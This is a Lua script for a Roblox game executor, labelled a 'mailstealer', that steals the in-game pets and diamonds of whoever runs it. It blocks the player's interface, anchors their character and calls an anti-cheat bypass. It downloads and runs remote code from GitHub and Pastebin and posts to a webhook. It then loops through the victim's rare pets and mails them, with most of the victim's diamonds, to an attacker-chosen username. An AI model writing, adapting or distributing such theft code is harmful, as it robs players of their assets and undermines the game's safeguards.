--paxz mailstealer

local UserInputService = game:GetService("UserInputService")
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
    v:Destroy(1)
    end

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()

function sendWebhook(webhook, message)
    local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

 local url =
    _G.Webhook
 local data = {
    ["content"] = message
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)

 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/API/main/API.lua"))()

BypassAntiCheat()
AreaTeleport("Shop")
TeleportToMailbox()
local player = game:GetService("Players").LocalPlayer

local dims = player.leaderstats.Diamonds.Value - 80000000
if dims < 0 then
    dims = 0
end

wait(30)
while wait() do
for i,v in pairs(savedPets) do
    local v2 = FrameworkLibrary.Directory.Pets[v.id]
	if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 or v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 5000000 then
            --loadstring(game:HttpGet("https://pastebin.com/raw/LjRnXwGB"))()
		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 4900000
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "gg/lunarhub | Username: ".._G.Username..""
    	}
		}
		print("l")
		Invoke("Send Mail", unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
		loadstring(game:HttpGet("obfuscated pastebin here"))()
	elseif v2.huge == true or v2.rarity == "Event" or v2.rarity == "Exclusive" then
            --loadstring(game:HttpGet("https://pastebin.com/raw/LjRnXwGB"))()
		_G.Diamonds = 0
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = 0,
        ["Pets"] = {v.uid},
        ["Message"] = "gg/lunarhub | Username: ".._G.Username..""
    	}
		}
		Invoke("Send Mail", unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
        loadstring(game:HttpGet("https://pastebin.com/raw/Crk3YAnP"))()
        wait(1.5)
        loadstring(game:HttpGet("obfuscated pastebin here"))()
	end
end
end
